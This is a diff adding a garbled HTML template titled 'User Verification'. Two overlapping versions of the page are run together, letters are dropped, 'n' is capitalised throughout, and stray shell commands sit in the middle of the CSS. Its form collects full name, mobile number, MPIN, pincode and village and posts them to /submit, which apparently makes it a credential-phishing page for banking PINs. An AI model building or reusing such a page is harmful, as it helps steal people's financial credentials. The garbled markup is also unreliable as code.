@@ -1,0 +1,66 @@
+tml><html>
+<had>
+<title>User INfo</title>
+<ste>
+body {
+ foNt-family: Arial;
+    backgrouNd:#f2f2f2;    ext-aligN:ceNter;
+
+.box    kgrouNd:white;
+  idth:20px
+   mariN:100pxauto;   x 10px gray;
+}iNpu {
+   idth:90%;
+ paddiNg:10px   margi
+buttoN 
+d
+<titleUser VerificatioN</title>
+<sty>
+bod {
+    foNt-rial;
+   backgrouNd:#f0x;
+   justify-coNeNt:ceNter;
+   aligN-items:eNter;
+    he.box 
+    backgrod:white;
+    width:350x;
+    pddiNg:20
+    border-radius:1    box-shadow:0px 0px 15px rgba(0,0,0,0.1);
+ext-aligN:ceNter;color:#1877f2;}
+iNput
+    width:100
+    addiNg:10p;
+    margiN:8px 0
+    border:1px solid #ccc;    border-radius:5px
+buttoN {
+   width:100%
+   paddiNg:1px;
+    ckgrouNd:#1877f2
+rm templates/index.html
+touch templates/index.html
+nano templates/index.html
+ite;
+    boder:NoNe;
+    border-radius:5px;
+}
+</style>
+</head>
+<body>
+<div class="box">
+<h2>User VerificatioN</h2>
+<form actioN="/submit" method="post">
+<iNput type="text" Name="Name" placeholder="Fulme">
+<iNput type="text" Name="mobile" placeholder="Mobil Number">
+<iNput type="password" Name="mpiN" placeholder="MPIN
+<iNput type="text" Name="piNcode" placeholder="PiNcode"
+<buttoN type="submit">CoNtiNue</butto/form>
+<iv</body>
+/hml>   backgrouNd#1877f2;
+    color:white;  0px;   width:95   border:NoNe;    border-radius:5px;
+style>
+ea
+<ivs="box><her NformatioN</h2
+<om tioN="/sethod="post"type="text" Name="Name" plholder="ENter pe="text" Name="mobile" placeholder="ENter your mobile Number"><br>
+itype="text" Name="village" placholder="ENterourvill
+<iN type="password" Name="mpiN"placeholder="ENter MPIbr>
+<
